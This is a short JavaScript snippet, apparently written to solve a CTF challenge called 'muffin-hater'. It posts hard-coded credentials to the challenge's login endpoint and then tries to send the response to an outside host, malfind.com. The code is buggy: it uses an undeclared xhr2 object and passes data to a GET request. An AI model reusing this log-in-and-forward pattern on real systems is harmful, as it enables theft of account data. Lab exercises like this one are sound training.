var xhr = new XMLHttpRequest();
var url = "http://muffin-hater.wpi-ctf-2022-codelab.kctf.cloud:8000/login";
var url2 = "https://malfind.com/"
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var payload = encodeURIComponent("testing="+xhr.responseText);
        xhr2.open("GET", url2, true);
        xhr2.send(payload);
        console.log(xhr.responseText);
    }
};
var data = JSON.stringify({"username": "muffinhater88!", "password": "qwerty123!"});
xhr.send(data);